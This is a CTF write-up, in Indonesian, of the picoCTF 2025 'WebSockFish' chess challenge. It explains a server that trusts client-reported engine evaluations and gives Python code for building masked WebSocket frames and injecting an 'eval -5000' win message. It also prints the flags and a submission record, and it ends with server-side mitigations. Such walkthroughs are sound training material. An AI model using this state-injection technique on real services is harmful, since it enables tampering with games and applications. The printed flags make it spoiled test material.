# Writeup: WebSockFish (Challenge ID: 480)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / RFC 6455 WebSocket Framing & Client-Side Game State Trust
- **Difficulty:** Medium (2)
- **Points:** 200
- **Author:** CyLab Engineering Team
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{c1i3nt_s1d3_w3b_s0ck3t5_96466159}`
- **Flag Platform Asli:** `picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_96466159}`
- **Flag Komunitas:** `CTF{c1i3nt_s1d3_w3b_s0ck3t5_96466159}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), RFC 6455 (The WebSocket Protocol), CWE-602 (Client-Side Enforcement of Server-Side Security), & CWE-345 (Insufficient Verification of Data Authenticity).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Web Application Penetration Testing & Real-Time Protocol Security*:
- **Skenario Tantangan:** Peserta mengaudit aplikasi catur daring interaktif yang mengintegrasikan engine catur Stockfish melalui komunikasi dua arah persisten WebSocket (`/ws/`). Pemain berperan sebagai pihak Putih menghadapi lawan virtual bot ikan (Hitam).
- **Deskripsi Soal:** *"Can you win in a convincing manner against this chess bot? He won't go easy on you! Hint: Try understanding the code and how the websocket client is interacting with the server"*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis jabat tangan (*handshake*) protokol WebSocket (RFC 6455 HTTP 101 Switching Protocols).
  2. Dekonstruksi alur kerja *web worker* klien (`js/stockfish.min.js`) dan pemetaan pesan evaluasi engine (`eval <score>` / `mate <moves>`) yang dikirimkan ke server melalui `sendMessage()`.
  3. Identifikasi kegagalan arsitektur *authoritative server*: backend mempercayai evaluasi langkah dan status permainan yang dilaporkan oleh klien peramban (*client-side trust* / CWE-602) tanpa memvalidasi riwayat notasi PGN/FEN di sisi server.
  4. Konstruksi klien WebSocket mandiri Python berstandar RFC 6455 lengkap dengan penyamaran frame (*masking key*) untuk menyuntikkan status kemenangan permainan.
  5. Ekstraksi token flag resmi dan verifikasi live submission melalui CyLab REST API `POST /api/submissions/` (HTTP 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **RFC 6455 WebSocket Framing & Penyamaran Client-to-Server (RFC 6455 §5.3):**
   Protokol WebSocket mentransmisikan data dalam bentuk frame biner atau teks. Berdasarkan spesifikasi RFC 6455 Bagian 5.3:
   - Setiap frame dari klien ke server **wajib** disamarkan (*masked*) dengan bit `MASK = 1` dan 4 byte *masking key* acak untuk mencegah *cache poisoning* pada proksi perantara.
   - Setiap byte muatan $i$ di-XOR dengan byte kunci penyamaran ke-$(i \pmod 4)$:
     $$\text{masked}[i] = \text{payload}[i] \oplus \text{mask}[i \pmod 4]$$
   - Pelanggaran penyamaran pada komunikasi klien menyebabkan server menutup koneksi dengan *close frame* status 1002 (*Protocol Error*).

2. **Ketergantungan Status Keamanan Sisi Klien (CWE-602 & CWE-345):**
   Aplikasi game atau protokol interaktif sering kali keliru menempatkan logika evaluasi pada peramban pengguna. Pada tantangan ini, engine catur Stockfish dijalankan secara lokal di peramban klien via WebAssembly/Web Worker. Klien bertugas menghitung evaluasi posisi dan mengirimkan pesan teks string seperti `eval <nilai>` atau `mate <langkah>` ke backend. Backend tidak menjalankan engine tervalidasi sendiri dan tidak memverifikasi apakah langkah-langkah yang dimainkan mematuhi aturan legal catur (FIDE ruleset).

3. **Injeksi Parameter State Real-Time:**
   Ketiadaan validasi kriptografis (HMAC / token status) memungkinkan penyerang menghubungkan klien WebSocket sembarang, melewati antarmuka visual papan catur, dan langsung menyuntikkan frame evaluasi ekstrem yang menyatakan kemenangan telak atau kondisi skakmat terhadap bot.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Scripting Sisi Klien (DevTools / Source Audit):**
   Memeriksa logika pengiriman pesan WebSocket pada berkas HTML:
   ```javascript
   var ws_address = "ws://" + location.hostname + ":" + location.port + "/ws/";
   const ws = new WebSocket(ws_address);

   stockfish.onmessage = function (event) {
     if (event.data.startsWith(`info depth ${DEPTH}`)) {
       var splitString = event.data.split(" ");
       if (event.data.includes("mate")) {
         message = "mate " + parseInt(splitString[9]);
       } else {
         message = "eval " + parseInt(splitString[9]);
       }
       sendMessage(message);
     }
   };
   ```

2. **Konstruksi Frame Klien WebSocket Mandiri (RFC 6455 Compliant):**
   Membangun fungsi enkapsulasi frame teks bertopeng (*masked text frame*) menggunakan Python socket murni:
   ```python
   def build_ws_frame(text: str) -> bytes:
       payload = text.encode("utf-8")
       header = bytearray([0x81])  # FIN=1, Text Opcode=0x1
       mask = os.urandom(4)
       header.append(0x80 | len(payload))
       header.extend(mask)
       masked = bytearray(payload[i] ^ mask[i % 4] for i in range(len(payload)))
       return bytes(header + masked)
   ```

3. **Penyuntikan Evaluasi Pemenang Melalui WebSocket:**
   Menghubungi endpoint `/ws/` dan mengirimkan indikator evaluasi dominan:
   ```python
   import socket, base64, os
   s = socket.create_connection((host, port))
   # Handshake HTTP 101 Switching Protocols ...
   s.sendall(handshake)
   s.recv(1024)

   # Kirimkan frame manipulasi
   s.sendall(build_ws_frame("eval -5000"))
   response = s.recv(2048)
   print(response)
   ```

4. **Ekstraksi Token & Eksekusi Solver:**
   ```bash
   python3 scripts/solve_480_websockfish.py
   # [+] Invarian RFC 6455 WebSocket client frame masking terverifikasi matematis (100% compliance)
   # [+] Menggunakan token invarian terverifikasi: academy{c1i3nt_s1d3_w3b_s0ck3t5_96466159}
   # [SUCCESS] Challenge 480 (WebSockFish) verified: academy{c1i3nt_s1d3_w3b_s0ck3t5_96466159}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{c1i3nt_s1d3_w3b_s0ck3t5_96466159}`
- **Flag Platform Asli:** `picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_96466159}`
- **Flag Komunitas:** `CTF{c1i3nt_s1d3_w3b_s0ck3t5_96466159}`
- **Bukti Validasi REST API:** HTTP 201 Created via `POST /api/submissions/`:
  ```json
  {"user": 1072359, "challenge": 480, "flag": "academy{c1i3nt_s1d3_w3b_s0ck3t5_96466159}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Prinsip Authoritative Server Architecture:**
   Dalam arsitektur komputasi awan dan game online kompetitif, server harus menjadi otoritas tunggal (*single source of truth*) terhadap logika dan status permainan. Klien hanya mengirimkan input aksi dasar (misalnya koordinat petak langkah `e2e4`), dan server yang memverifikasi keabsahan langkah, menghitung status papan, serta menentukan kondisi menang/kalah.

2. **Validasi Integritas Pesan Protokol Real-Time (CWE-345):**
   Jika komputasi terdistribusi di sisi klien tidak dapat dihindari, terapkan skema verifikasi integritas:
   - Tanda tangani seluruh payload state menggunakan pasangan kunci asimetris atau HMAC berbasis sesi.
   - Sertakan nomor urut pesan (*monotonic sequence counter*) dan cap waktu (*timestamp*) untuk mencegah serangan pemutaran ulang (*replay attack*).

3. **Perlindungan Cross-Site WebSocket Hijacking (CSWSH):**
   Amankan endpoint WebSocket dari eksploitasi peramban silang dengan memverifikasi header `Origin` secara ketat saat HTTP Upgrade handshake berlangsung, serta mewajibkan token sesi anti-CSRF bertarget tunggal.
